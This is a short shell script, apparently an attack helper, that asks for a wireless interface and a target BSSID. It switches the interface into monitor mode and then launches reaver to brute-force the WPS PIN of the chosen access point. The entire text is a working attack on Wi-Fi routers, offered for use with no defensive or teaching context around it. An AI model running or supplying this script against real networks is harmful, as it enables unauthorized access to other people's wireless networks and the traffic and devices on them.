echo Which interface do you want to use for the attack ?
read inputInterface

echo Which BSSID do you want to attack ?
read inputBssid

sudo service NetworkManager stop
sudo ifconfig $inputInterface down
sudo iwconfig $inputInterface mode monitor
sudo ifconfig $inputInterface up
sudo service NetworkManager start

reaver -i $inputInterface -b $inputBssid -r 2:300 -S -N -vv
